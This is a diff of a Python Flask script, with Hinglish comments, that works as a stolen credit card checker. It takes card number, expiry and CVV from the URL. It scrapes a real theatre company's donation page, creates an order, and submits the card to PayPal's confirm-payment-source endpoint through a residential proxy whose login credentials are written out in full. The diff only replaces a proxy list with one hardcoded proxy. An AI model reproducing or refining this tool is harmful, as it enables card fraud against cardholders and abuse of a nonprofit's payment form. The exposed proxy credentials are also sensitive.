@@ -1,29 +1,24 @@
 import requests
 import base64
 import re
-import random
 from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-# SIRF YAHAN CHANGE KARO - PURANA PROXY HATAKE YE DALO
-PROXY_LIST = [
-    {'http': 'http://Quantum-wn20la7vz1eG1l1l2:vb0ifitn@new.quantumproxies.net:10000', 'https': 'http://Quantum-wn20la7vz1eG1l1l2:vb0ifitn@new.quantumproxies.net:10000'}
-]
-
-def get_random_proxy():
-    return random.choice(PROXY_LIST) if PROXY_LIST else None
+# QUANTUM RESIDENTIAL PROXY
+QUANTUM_PROXY = {
+    'http': 'http://Quantum-wn20la7vz1eG1l1l2:vb0ifitn@new.quantumproxies.net:10000',
+    'https': 'http://Quantum-wn20la7vz1eG1l1l2:vb0ifitn@new.quantumproxies.net:10000'
+}
 
 @app.route('/cc=<cc>|<mm>|<yy>|<cvv>', methods=['GET'])
 def check_card(cc, mm, yy, cvv):
     session = requests.session()
     
-    # Random proxy select karo
-    proxy = get_random_proxy()
-    print(f"Using proxy: Quantum Residential Proxy")
+    # Quantum proxy use karo
+    session.proxies.update(QUANTUM_PROXY)
 
     try:
-        # Step 1: Get donation page with proxy
         headers = {
             'authority': 'atlanticcitytheatrecompany.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -40,9 +35,8 @@ def check_card(cc, mm, yy, cvv):
             'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
         }
 
-        response = session.get('https://atlanticcitytheatrecompany.com/donations/donate/', headers=headers, proxies=proxy, timeout=30)
+        response = session.get('https://atlanticcitytheatrecompany.com/donations/donate/', headers=headers)
 
-        # Extract required data
         prefix_match = re.search(r'give-form-id-prefix" value="([^"]+)"', response.text)
         if prefix_match:
             prefix = prefix_match.group(1)
@@ -65,7 +59,6 @@ def check_card(cc, mm, yy, cvv):
         if acc_match:
             acc = acc_match.group(1)
 
-        # Step 2: Create order with proxy
         headers = {
             'authority': 'atlanticcitytheatrecompany.com',
             'accept': '*/*',
@@ -122,11 +115,8 @@ def check_card(cc, mm, yy, cvv):
             params=params,
             headers=headers,
             files=files,
-            proxies=proxy,
-            timeout=30
         )
 
-        # Step 3: Confirm payment with proxy
         headers = {
             'authority': 'cors.api.paypal.com',
             'accept': '*/*',
@@ -168,14 +158,12 @@ def check_card(cc, mm, yy, cvv):
             'https://cors.api.paypal.com/v2/checkout/orders/8B515934GC0616145/confirm-payment-source',
             headers=headers,
             json=json_data,
-            proxies=proxy,
-            timeout=30
         )
 
         return jsonify(response.json())
 
     except Exception as e:
-        return jsonify({'error': f'Proxy/Request failed: {str(e)}'})
+        return jsonify({'error': str(e)})
 
 if __name__ == '__main__':
     app.run(debug=True)
